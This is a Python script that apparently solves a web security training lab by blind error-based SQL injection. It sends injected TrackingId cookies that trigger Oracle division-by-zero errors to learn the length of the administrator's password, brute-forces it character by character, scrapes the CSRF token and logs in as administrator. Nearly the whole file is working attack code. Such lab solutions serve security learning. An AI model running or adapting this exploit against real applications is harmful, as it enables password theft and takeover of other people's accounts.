from ...utils import *
from bs4 import BeautifulSoup
from urllib.parse import urljoin

import requests
import string


def solve_lab(url, proxies):
    print_info(
        f'Determining the length of the administrator password by visiting "{url}" with the following cookies:'
    )
    print(
        '{"TrackingId": "\' UNION SELECT CASE WHEN (LENGTH((SELECT password FROM users WHERE username=\'administrator\'))=\033[1;93m?\033[00m) THEN TO_CHAR(1/0) ELSE NULL END FROM dual --"}'
    )

    len_pass = 1
    while True:
        cookies = {
            "TrackingId": f"' UNION SELECT CASE WHEN (LENGTH((SELECT password FROM users WHERE username='administrator'))={len_pass}) THEN TO_CHAR(1/0) ELSE NULL END FROM dual --"
        }
        resp = requests.get(url, proxies=proxies, verify=False, cookies=cookies)

        if resp.status_code == 200:
            print_info_secondary(f"{len_pass} => 200", end="")
            len_pass += 1
        else:
            print_success(f"{len_pass} => {resp.status_code}\n")
            break

    print_info(
        f'Determining administrator password by visting "{url}" with the following cookies:'
    )
    print(
        '{"TrackingId": "\' UNION SELECT CASE WHEN (SUBSTR((SELECT password FROM users WHERE username=\'administrator\'), \033[1;93m?\033[00m, 1)=\033[1;93m?\033[00m) THEN TO_CHAR(1/0) ELSE NULL END FROM dual --"}'
    )
    alphabet = string.ascii_letters + string.digits + string.punctuation
    password = ""

    for i in range(len_pass):
        for c in alphabet:
            cookies = {
                "TrackingId": f"' UNION SELECT CASE WHEN (SUBSTR((SELECT password FROM users WHERE username='administrator'), {i+1}, 1)='{c}') THEN TO_CHAR(1/0) ELSE NULL END FROM dual --"
            }
            resp = requests.get(url, proxies=proxies, verify=False, cookies=cookies)

            if resp.status_code == 200:
                print_info_secondary(
                    f"{i+1}, '{c}' => 200 | Progress: {password}...", end=""
                )
            else:
                print_success(
                    f"{i+1}, '{c}' => {resp.status_code} | Progress: {password}...",
                    end="",
                )
                password += c
                break
        else:
            print()
            print_fail(f"Unable to determine character at index {i}")

    print()
    print_success(f"Successfully extracted administrator password: {password}\n")

    url = urljoin(url, "/login")
    print_info(f'Grabbing CSRF value from "{url}"...')

    s = requests.session()
    resp = s.get(url, proxies=proxies, verify=False)
    soup = BeautifulSoup(resp.text, "html.parser")
    csrf = soup.select_one('input[name="csrf"]').get("value")

    if csrf is None:
        print_fail("Unable to grab CSRF value.")

    else:
        print_success(f"CSRF value: {csrf}\n")

    data = {"csrf": csrf, "username": "administrator", "password": password}
    print_info("Logging in with the following values:")
    print(data)

    resp = s.post(
        url,
        proxies=proxies,
        verify=False,
        data=data,
    )
    print_success("SQL injection attack performed.\n")
